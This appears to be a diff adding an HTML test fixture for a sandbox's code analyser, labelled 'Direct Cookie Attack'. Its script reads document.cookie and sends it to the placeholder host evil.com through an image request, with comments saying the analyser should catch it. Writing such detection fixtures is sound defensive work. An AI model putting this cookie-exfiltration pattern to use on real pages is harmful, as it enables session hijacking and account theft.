@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Direct Cookie Attack</title>
+</head>
+<body>
+  <!-- Attack: Cookie access violates L1 sandbox boundary -->
+  <script>
+    // This should be caught by AST analysis - document.cookie is banned
+    const cookies = document.cookie;
+    // Exfiltrate to attacker
+    const img = new Image();
+    img.src = 'https://evil.com/steal?c=' + encodeURIComponent(cookies);
+  </script>
+</body>
+</html>
